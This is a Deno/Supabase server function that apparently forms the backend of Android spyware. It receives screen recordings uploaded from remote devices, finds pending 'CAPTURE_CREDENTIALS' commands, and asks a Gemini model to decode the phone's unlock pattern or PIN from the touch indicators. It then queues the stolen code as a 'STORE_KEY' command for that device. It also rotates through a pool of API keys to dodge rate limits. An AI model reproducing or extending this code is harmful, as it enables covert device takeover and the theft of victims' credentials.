import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { encode as base64Encode } from "https://deno.land/std@0.145.0/encoding/base64.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
  const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
  const supabase = createClient(supabaseUrl, supabaseServiceKey);

  try {
    const payload = await req.json();
    console.log("[VISION_ENGINE] Webhook triggered.");

    let file_path = "";
    let device_id = "";
    let command_id = null;
    let bucket_id = "cortex-vision-vault";

    // Resolve Metadata
    if (payload.record && payload.table === "objects") {
      file_path = payload.record.name; 
      bucket_id = payload.record.bucket_id;
      if (bucket_id !== "cortex-vision-vault") return new Response("Ignored bucket", { status: 200 });
      device_id = file_path.split("/")[0];
    } else {
      file_path = payload.file_path;
      device_id = payload.device_id;
      command_id = payload.command_id;
    }

    // Discovery: Find CAPTURE_CREDENTIALS cmd if not provided
    if (!command_id) {
      const { data: cmdData } = await supabase
        .from("file_commands")
        .select("id")
        .eq("device_id", device_id)
        .eq("file_name", "CAPTURE_CREDENTIALS")
        .neq("status", "RECOVERY_SUCCESS")
        .order("created_at", { ascending: false })
        .limit(1);
      if (cmdData?.length) command_id = cmdData[0].id;
    }

    // Prepare Media
    const { data: fileData, error: dlErr } = await supabase.storage.from(bucket_id).download(file_path);
    if (dlErr) throw dlErr;
    const base64Video = base64Encode(new Uint8Array(await fileData.arrayBuffer()));

    // KEY ROTATION LOGIC
    const { data: apiKeys, error: keyErr } = await supabase
      .from("api_keys")
      .select("id, api_key")
      .eq("service", "gemini")
      .eq("is_active", true)
      .or(`cooldown_until.is.null,cooldown_until.lt.${new Date().toISOString()}`)
      .order("last_used_at", { ascending: true, nullsFirst: true });

    if (keyErr || !apiKeys?.length) throw new Error("No available Gemini API keys in pool.");

    let geminiResult = null;
    let successKeyId = null;

    for (const keyRow of apiKeys) {
      console.log(`[VISION_ENGINE] Attempting analysis with key ID: ${keyRow.id}`);
      
      const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-3.1-flash-lite:generateContent?key=${keyRow.api_key}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          contents: [{ parts: [{ inlineData: { mimeType: "video/mp4", data: base64Video } }, { text: "Analyze touch indicators to decode Android pattern/PIN. Return ONLY raw JSON: {\"success\":bool, \"type\":\"PATTERN|PIN\", \"key\":any, \"confidence\":float}" }] }],
          generationConfig: { responseMimeType: "application/json" }
        })
      });

      if (response.status === 429) {
        console.warn(`[VISION_ENGINE] Key ${keyRow.id} hit rate limit. Cooling down for 1 hour.`);
        const cooldown = new Date(Date.now() + 60 * 60 * 1000).toISOString();
        await supabase.from("api_keys").update({ cooldown_until: cooldown }).eq("id", keyRow.id);
        continue; // Try next key
      }

      if (!response.ok) {
        console.error(`[VISION_ENGINE] Key ${keyRow.id} failed with status ${response.status}: ${await response.text()}`);
        continue;
      }

      const resJson = await response.json();
      const text = resJson.candidates?.[0]?.content?.parts?.[0]?.text;
      if (text) {
        geminiResult = JSON.parse(text.trim());
        successKeyId = keyRow.id;
        break; // Success!
      }
    }

    if (!geminiResult) throw new Error("All keys in pool failed to provide a valid analysis.");

    // Finalize: Update key usage and broadcast results
    await supabase.from("api_keys").update({ last_used_at: new Date().toISOString() }).eq("id", successKeyId);

    if (geminiResult.success && geminiResult.key) {
      const keyStr = typeof geminiResult.key === "object" ? JSON.stringify(geminiResult.key) : String(geminiResult.key);
      await supabase.from("file_commands").insert([{ device_id, file_name: "STORE_KEY", content: `${geminiResult.type} | ${keyStr}`, status: "PENDING" }]);
      if (command_id) await supabase.from("file_commands").update({ status: "RECOVERY_SUCCESS", result_data: geminiResult }).eq("id", command_id);
    } else {
      if (command_id) await supabase.from("file_commands").update({ status: "RECOVERY_FAILED", error_log: "Gemini failed to extract key" }).eq("id", command_id);
    }

    return new Response(JSON.stringify(geminiResult), { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });

  } catch (err) {
    console.error("[VISION_ENGINE_FATAL]", err.message);
    return new Response(JSON.stringify({ error: err.message }), { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});